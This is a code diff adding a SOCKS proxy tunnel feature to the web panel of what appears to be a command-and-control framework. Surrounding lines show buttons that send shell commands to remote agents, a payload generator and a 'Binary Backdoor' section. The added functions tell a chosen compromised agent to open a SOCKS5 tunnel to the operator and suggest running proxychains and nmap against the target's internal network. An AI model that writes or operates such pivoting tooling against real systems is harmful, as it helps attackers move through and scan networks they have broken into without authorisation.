@@ -525,6 +525,9 @@ tr.clickable { cursor: pointer; }
         <button class="qbtn" onclick="sendShell('ipconfig /all')">ipconfig</button>
         <button class="qbtn" onclick="sendShell('ifconfig')">ifconfig</button>
         <button class="qbtn danger" onclick="quickCmd('kill')">kill</button>
+        <span style="color:var(--border);margin:0 4px">|</span>
+        <button class="qbtn" onclick="startTunnel()" style="background:var(--blue-dim);color:var(--blue)">SOCKS Proxy</button>
+        <button class="qbtn" onclick="stopTunnel()" style="background:var(--red-dim);color:var(--red);font-size:10px">Stop Tunnel</button>
       </div>
 
       <div class="terminal">
@@ -2019,6 +2022,35 @@ async function generatePayload() {
 
   btn.textContent = 'Generate Payload';
   btn.disabled = false;
+}
+
+// ──── SOCKS Tunnel ────
+async function startTunnel() {
+  const agent = document.getElementById('agent-select').value;
+  if (!agent) { alert('Select an agent first'); return; }
+  const port = prompt('SOCKS5 bind port on YOUR machine (default: 1080):', '1080');
+  if (!port) return;
+  const bind = '127.0.0.1:' + port;
+  try {
+    const resp = await fetch('/api/tunnel/start', {
+      method:'POST', headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({agent:agent, bind:bind})
+    });
+    const data = await resp.json();
+    if (data.error) { termLog('error', 'Tunnel error: ' + data.error); return; }
+    termLog('success', data.message);
+    termLog('info', 'Proxychains config: socks5 127.0.0.1 ' + port);
+    termLog('info', 'Usage: proxychains nmap -sT -Pn <target_network>');
+  } catch(e) { termLog('error', 'Tunnel failed: ' + e.message); }
+}
+
+async function stopTunnel() {
+  const agent = document.getElementById('agent-select').value;
+  if (!agent) { alert('Select an agent first'); return; }
+  try {
+    await fetch('/api/tunnel/stop?agent=' + encodeURIComponent(agent));
+    termLog('info', 'SOCKS tunnel stopped for ' + agent);
+  } catch(e) { termLog('error', e.message); }
 }
 
 // ──── Binary Backdoor ────
